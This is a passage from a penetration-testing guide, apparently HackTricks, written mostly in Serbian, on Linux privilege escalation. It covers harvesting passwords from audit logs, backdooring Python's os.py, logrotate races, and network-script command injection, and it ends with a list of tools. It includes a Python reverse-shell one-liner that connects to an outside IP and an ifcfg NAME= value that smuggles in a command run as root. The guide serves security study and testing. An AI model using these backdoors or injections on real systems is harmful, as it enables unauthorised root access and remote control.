Što je log čudniji, to će verovatno biti zanimljiviji.\
Takođe, neki "**bad**" configured (backdoored?) **audit logovi** mogu omogućiti da se **lozinke zapisuju** u njima, kao što je objašnjeno u ovom postu: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Da biste čitali logove, grupa [**adm**](interesting-groups-linux-pe/index.html#adm-group) će biti veoma korisna.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generičko pretraživanje Creds/Regex

Takođe treba da proveriš fajlove koji sadrže reč "**password**" u svom **imenu** ili u **sadržaju**, i da proveriš IP-ove i email adrese u logovima, ili hash-ove pomoću regexps.\
Neću ovde nabrajati kako se sve to radi, ali ako te zanima možeš pogledati poslednje provere koje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) izvršava.

## Datoteke kojima se može pisati

### Python library hijacking

If you know from **where** a python script is going to be executed and you **can write inside** that folder or you can **modify python libraries**, you can modify the OS library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library).

Da bi **backdoor the library** samo dodaj na kraj os.py biblioteke sledeću liniju (promeni IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate eksploatacija

Ranljivost u `logrotate` omogućava korisnicima sa **write permissions** na log fajlu ili njegovim roditeljskim direktorijumima da potencijalno dobiju eskalirane privilegije. To je zato što se `logrotate`, često pokretan kao **root**, može manipulisati da izvrši proizvoljne fajlove, posebno u direktorijumima kao što je _**/etc/bash_completion.d/**_. Važno je proveriti dozvole ne samo u _/var/log_ već i u bilo kom direktorijumu gde se primenjuje rotacija logova.

> [!TIP]
> Ova ranjivost utiče na `logrotate` verziju `3.18.0` i starije

Detaljnije informacije o ranjivosti mogu se naći na ovoj stranici: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Možete iskoristiti ovu ranjivost pomoću [**logrotten**](https://github.com/whotwagner/logrotten).

Ova ranjivost je veoma slična [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** tako da kad god otkrijete da možete menjati logove, proverite ko upravlja tim logovima i razmotrite da li možete eskalirati privilegije zamenom logova symlinkovima.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ako, iz bilo kog razloga, korisnik može da **write** `ifcf-<whatever>` skriptu u _/etc/sysconfig/network-scripts_ **or** može da **adjust** postojeću, onda vam je **system pwned**.

Network skripte, _ifcg-eth0_ na primer, koriste se za mrežne konekcije. Izgledaju tačno kao .INI fajlovi. Međutim, one su ~sourced~ na Linuxu od strane Network Manager-a (dispatcher.d).

U mom slučaju, atribut `NAME=` u tim network skriptama nije ispravno obrađen. Ako u imenu postoji razmak, **sistem pokušava da izvrši deo koji sledi nakon razmaka**. To znači da se **sve nakon prvog razmaka izvršava kao root**.

Na primer: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Напomena: пpазан размак између Network и /bin/id_)

### **init, init.d, systemd, and rc.d**

Direktorijum `/etc/init.d` sadrži **skripte** za System V init (SysVinit), **klasičan Linux систем за управљање сервисима**. Uključuje skripte za `start`, `stop`, `restart`, и понекад `reload` сервиса. Ove се могу извршити директно или преко симболичких линкова који се налазе у `/etc/rc?.d/`. Алтернатвна путања на Redhat системима је `/etc/rc.d/init.d`.

Са друге стране, `/etc/init` је повезан са **Upstart**, новијим **sistemom за управљање сервисима** који је увео Ubuntu и који користи конфигурационе фајлове за задатке управљања сервисима. Упркос транзицији на Upstart, SysVinit скрипте се и даље користе уз Upstart конфигурације због слоја за компатибилност у Upstart-у.

**systemd** се појављује као модеран init и менаџер сервиса, нудећи напредне функције као што су покретање daemon-а on-demand, управљање automount-овима и снимци стања система. Фајлове организује у `/usr/lib/systemd/` за пакете дистрибуције и `/etc/systemd/system/` за измене администратора, поједностављујући процес управљања системом.

## Остали трикови

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks често hook-ују syscall да би изложили привилеговану kernel функционалност userspace manager-у. Слаба аутентикација manager-а (нпр. провере потписа засноване на FD-order или лоше шеме лозинки) може омогућити локалној апликацији да се представи као manager и ескалира до root на уређајима који су већ root-овани. Сазнајте више и детаље експлоатације овде:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel sigurnosne zaštite

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Još pomoći

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Najbolji alat za pronalaženje Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Prikupljanje više skripti**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Reference

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
